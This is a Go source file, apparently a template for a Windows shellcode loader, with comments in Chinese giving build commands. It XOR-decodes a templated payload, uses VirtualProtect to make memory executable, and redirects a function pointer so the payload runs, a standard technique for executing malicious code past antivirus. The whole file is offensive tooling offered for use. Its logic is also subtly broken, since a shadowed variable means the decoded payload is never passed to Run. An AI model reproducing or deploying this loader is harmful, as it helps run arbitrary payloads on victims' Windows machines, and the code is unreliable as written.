package main
/*

32 位 运行
set CGO_ENABLED=0
set GOOS=windows 
set GOARCH=386 
go build -ldflags="-s -w" encryptedShellcodeWrapper.go

64 位 运行 win_64.bat
set CGO_ENABLED=0
set GOOS=windows 
set GOARCH=amd64 
go build -ldflags="-s -w" encryptedShellcodeWrapper.go

golang 暂时只有xor
*/

import (
    "syscall"
    "unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
    ret, _, _ := procVirtualProtect.Call(
        uintptr(lpAddress),
        uintptr(dwSize),
        uintptr(flNewProtect),
        uintptr(lpflOldProtect))
    return ret > 0
}

func Run(sc []byte) {
    // TODO need a Go safe fork
    // Make a function ptr
    f := func() {}

    // Change permissions on f function ptr
    var oldfperms uint32
    if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
        panic("Call to VirtualProtect failed!")
    }

    // Override function ptr
    **(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

    // Change permissions on shellcode string data
    var oldshellcodeperms uint32
    if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
        panic("Call to VirtualProtect failed!")
    }

    // Call the function ptr it
    f()
}
func xor(src []byte, key []byte) []byte {
    for i := 0; i < len(src); i++ {
        src[i] ^= key[i%len(key)]
    }
    return src
}

func main() {
    shellcode := []byte("")
    encodeshellcode := []byte("${shellcode}")
    key :=[]byte("${key}")
    cipherType :="${cipherType}"
    if cipherType == "xor" {
        shellcode := xor(encodeshellcode,key)
    }
    Run(shellcode)
}
